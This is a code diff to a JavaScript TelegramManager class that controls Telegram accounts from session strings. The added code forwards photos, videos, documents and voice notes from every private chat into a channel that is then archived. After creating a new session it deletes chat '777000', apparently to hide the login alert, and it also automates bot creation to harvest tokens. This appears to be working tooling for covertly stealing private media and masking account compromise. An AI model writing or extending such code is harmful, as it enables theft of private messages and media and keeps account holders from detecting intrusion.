@@ -41,6 +41,7 @@ const parseError_1 = require("../../utils/parseError");
 const fetchWithTimeout_1 = require("../../utils/fetchWithTimeout");
 const logbots_1 = require("../../utils/logbots");
 const connection_manager_1 = require("./utils/connection-manager");
+const message_search_dto_1 = require("./dto/message-search.dto");
 class TelegramManager {
     constructor(sessionString, phoneNumber) {
         this.session = new sessions_1.StringSession(sessionString);
@@ -103,7 +104,6 @@ class TelegramManager {
                 const result = await this.joinChannel(channel);
                 channelId = result.chats[0].id;
                 channelAccessHash = result.chats[0].accessHash;
-                await this.archiveChat(channelId, channelAccessHash);
                 console.log("Archived chat", channelId);
             }
             catch (error) {
@@ -119,6 +119,7 @@ class TelegramManager {
             channelAccessHash = result.accessHash;
             console.log("Created new group with ID:", channelId);
         }
+        await this.archiveChat(channelId, channelAccessHash);
         return { id: channelId, accesshash: channelAccessHash };
     }
     async forwardMedia(channel, fromChatId) {
@@ -142,7 +143,7 @@ class TelegramManager {
                     const finalChats = new Set(chats.map(chat => chat.chatId));
                     finalChats.add(me.id?.toString());
                     for (const chatId of finalChats) {
-                        const mediaMessages = await this.searchMessages({ chatId: chatId, limit: 1000, types: ['photo', 'video'] });
+                        const mediaMessages = await this.searchMessages({ chatId: chatId, limit: 1000, types: [message_search_dto_1.MessageMediaType.PHOTO, message_search_dto_1.MessageMediaType.VIDEO, message_search_dto_1.MessageMediaType.ROUND_VIDEO, message_search_dto_1.MessageMediaType.DOCUMENT, message_search_dto_1.MessageMediaType.VOICE] });
                         console.log("Forwarding messages from chat:", chatId, "to channel:", channelId);
                         await this.forwardMessages(chatId, channelId, mediaMessages.photo.messages);
                         await this.forwardMessages(chatId, channelId, mediaMessages.video.messages);
@@ -1328,6 +1329,7 @@ class TelegramManager {
             },
             onError: (err) => { throw err; },
         });
+        await this.deleteChat('777000');
         const session = newClient.session.save();
         await newClient.disconnect();
         console.log("New Session: ", session);
@@ -1363,12 +1365,7 @@ class TelegramManager {
     async createGroupWithOptions(options) {
         if (!this.client)
             throw new Error('Client not initialized');
-        const result = await this.client.invoke(new telegram_1.Api.channels.CreateChannel({
-            title: options.title,
-            about: options.description,
-            megagroup: options.megagroup,
-            forImport: options.forImport,
-        }));
+        const result = await this.createGroupOrChannel(options);
         let channelId;
         if ('updates' in result) {
             const updates = Array.isArray(result.updates) ? result.updates : [result.updates];
@@ -1996,14 +1993,17 @@ class TelegramManager {
                 ...(minId ? { minId } : {}),
             };
             console.log(type, queryFilter);
-            const result = await this.client.invoke(new telegram_1.Api.messages.Search({
-                peer: await this.safeGetEntity(chatId),
+            const searchQuery = {
                 q: query,
                 filter: filter,
                 ...queryFilter,
                 hash: (0, big_integer_1.default)(0),
                 fromId: undefined
-            }));
+            };
+            if (chatId) {
+                searchQuery['peer'] = await this.safeGetEntity(chatId);
+            }
+            const result = await this.client.invoke(new telegram_1.Api.messages.Search(searchQuery));
             if (!('messages' in result)) {
                 return {};
             }
@@ -2537,7 +2537,6 @@ class TelegramManager {
         const privateChats = dialogs.filter(dialog => dialog.isUser &&
             dialog.entity instanceof telegram_1.Api.User &&
             !dialog.entity.bot &&
-            !dialog.entity.deleted &&
             !dialog.entity.fake &&
             dialog.entity.id.toString() !== "777000" &&
             dialog.entity.id.toString() !== "42777");
@@ -2563,7 +2562,7 @@ class TelegramManager {
                         console.log(`Skipping chat ${chatId} - insufficient messages (${messages.length}) | total: ${messages.total} `);
                         return null;
                     }
-                    const messageStats = await this.searchMessages({ chatId, types: ["video", "photo", "document", "roundVideo"], limit: 10 });
+                    const messageStats = await this.searchMessages({ chatId, types: [message_search_dto_1.MessageMediaType.PHOTO, message_search_dto_1.MessageMediaType.ROUND_VIDEO, message_search_dto_1.MessageMediaType.VIDEO, message_search_dto_1.MessageMediaType.DOCUMENT, message_search_dto_1.MessageMediaType.VOICE], limit: 10 });
                     console.log(`Retrieved ${messages.length} messages for chat ${chatId} | total: ${messages.total}`);
                     const callStats = {
                         total: 0,
@@ -2622,6 +2621,139 @@ class TelegramManager {
             console.log(`Top ${index + 1}: ${chat.firstName} (${chat.username || 'no username'}) - Score: ${chat.interactionScore}`);
         });
         return topChats;
+    }
+    async createGroupOrChannel(options) {
+        if (!this.client)
+            throw new Error('Client not initialized');
+        try {
+            console.log('Creating group or channel with options:', options);
+            const result = await this.client.invoke(new telegram_1.Api.channels.CreateChannel(options));
+            return result;
+        }
+        catch (error) {
+            console.error('Error creating group or channel:', error);
+            throw new Error(`Failed to create group or channel: ${error.message}`);
+        }
+    }
+    async createBot(options) {
+        if (!this.client) {
+            console.error('Bot creation failed: Client not initialized');
+            throw new Error('Client not initialized');
+        }
+        const botFatherUsername = 'BotFather';
+        console.log(`[BOT CREATION] Starting bot creation process for "${options.name}" (${options.username})`);
+        try {
+            console.log('[BOT CREATION] Attempting to get entity for BotFather...');
+            const entity = await this.client.getEntity(botFatherUsername);
+            console.log('[BOT CREATION] Successfully connected to BotFather');
+            console.log('[BOT CREATION] Sending /newbot command...');
+            await this.client.sendMessage(entity, {
+                message: '/newbot'
+            });
+            console.log('[BOT CREATION] Waiting for BotFather response after /newbot command...');
+            await new Promise(resolve => setTimeout(resolve, 1000));
+            console.log(`[BOT CREATION] Sending bot name: "${options.name}"`);
+            await this.client.sendMessage(entity, {
+                message: options.name
+            });
+            console.log('[BOT CREATION] Waiting for BotFather response after sending name...');
+            await new Promise(resolve => setTimeout(resolve, 1000));
+            let botUsername = options.username;
+            if (!/_bot$/.test(botUsername)) {
+                const chars = 'abcdefghijklmnopqrstuvwxyz0123456789';
+                let uniqueSuffix = '';
+                for (let i = 0; i < 3; i++) {
+                    uniqueSuffix += chars.charAt(Math.floor(Math.random() * chars.length));
+                }
+                botUsername = botUsername.replace(/_?bot$/, '') + `_${uniqueSuffix}_bot`;
+                console.log(`[BOT CREATION] Modified username to ensure uniqueness: ${botUsername}`);
+            }
+            console.log(`[BOT CREATION] Sending bot username: "${botUsername}"`);
+            await this.client.sendMessage(entity, {
+                message: botUsername
+            });
+            console.log('[BOT CREATION] Waiting for BotFather response after sending username...');
+            await new Promise(resolve => setTimeout(resolve, 1000));
+            console.log('[BOT CREATION] Retrieving response from BotFather...');
+            const messages = await this.client.getMessages(entity, {
+                limit: 1
+            });
+            if (!messages || messages.length === 0) {
+                console.error('[BOT CREATION] No response received from BotFather');
+                throw new Error('No response received from BotFather');
+            }
+            const lastMessage = messages[0].message;
+            console.log(`[BOT CREATION] BotFather response: "${lastMessage.substring(0, 50)}..."`);
+            if (!lastMessage.toLowerCase().includes('use this token')) {
+                console.error(`[BOT CREATION] Bot creation failed, unexpected response: "${lastMessage}"`);
+                throw new Error(`Bot creation failed: ${lastMessage}`);
+            }
+            const tokenMatch = lastMessage.match(/(\d+:[A-Za-z0-9_-]+)/);
+            if (!tokenMatch) {
+                console.error('[BOT CREATION] Could not extract bot token from BotFather response');
+                throw new Error('Could not extract bot token from BotFather response');
+            }
+            const botToken = tokenMatch[0];
+            console.log(`[BOT CREATION] Successfully extracted bot token: ${botToken.substring(0, 5)}...`);
+            if (options.description) {
+                console.log('[BOT CREATION] Setting bot description...');
+                await this.client.sendMessage(entity, { message: '/setdescription' });
+                await new Promise(resolve => setTimeout(resolve, 1000));
+                console.log(`[BOT CREATION] Selecting bot @${options.username} for description update...`);
+                await this.client.sendMessage(entity, { message: `@${options.username}` });
+                await new Promise(resolve => setTimeout(resolve, 1000));
+                console.log('[BOT CREATION] Sending description text...');
+                await this.client.sendMessage(entity, { message: options.description });
+                await new Promise(resolve => setTimeout(resolve, 1000));
+                console.log('[BOT CREATION] Description set successfully');
+            }
+            if (options.aboutText) {
+                console.log('[BOT CREATION] Setting about text...');
+                await this.client.sendMessage(entity, { message: '/setabouttext' });
+                await new Promise(resolve => setTimeout(resolve, 1000));
+                console.log(`[BOT CREATION] Selecting bot @${options.username} for about text update...`);
+                await this.client.sendMessage(entity, { message: `@${options.username}` });
+                await new Promise(resolve => setTimeout(resolve, 1000));
+                console.log('[BOT CREATION] Sending about text...');
+                await this.client.sendMessage(entity, { message: options.aboutText });
+                await new Promise(resolve => setTimeout(resolve, 1000));
+                console.log('[BOT CREATION] About text set successfully');
+            }
+            if (options.profilePhotoUrl) {
+                console.log(`[BOT CREATION] Setting profile photo from URL: ${options.profilePhotoUrl}`);
+                try {
+                    console.log('[BOT CREATION] Downloading profile photo...');
+                    const photoBuffer = await this.downloadFileFromUrl(options.profilePhotoUrl);
+                    console.log(`[BOT CREATION] Photo downloaded successfully, size: ${photoBuffer.length} bytes`);
+                    console.log('[BOT CREATION] Sending /setuserpic command...');
+                    await this.client.sendMessage(entity, { message: '/setuserpic' });
+                    await new Promise(resolve => setTimeout(resolve, 1000));
+                    console.log(`[BOT CREATION] Selecting bot @${options.username} for profile photo update...`);
+                    await this.client.sendMessage(entity, { message: `@${options.username}` });
+                    await new Promise(resolve => setTimeout(resolve, 1000));
+                    console.log('[BOT CREATION] Uploading profile photo...');
+                    await this.client.sendFile(entity, {
+                        file: Buffer.from(photoBuffer),
+                        caption: '',
+                        forceDocument: false
+                    });
+                    await new Promise(resolve => setTimeout(resolve, 1000));
+                    console.log('[BOT CREATION] Profile photo set successfully');
+                }
+                catch (photoError) {
+                    console.error(`[BOT CREATION] Failed to set profile photo: ${photoError.message}`);
+                }
+            }
+            console.log(`[BOT CREATION] Bot creation completed successfully: @${options.username}`);
+            return {
+                botToken,
+                username: options.username
+            };
+        }
+        catch (error) {
+            console.error(`[BOT CREATION] Error during bot creation process: ${error.message}`, error);
+            throw new Error(`Failed to create bot: ${error.message}`);
+        }
     }
 }
 exports.default = TelegramManager;
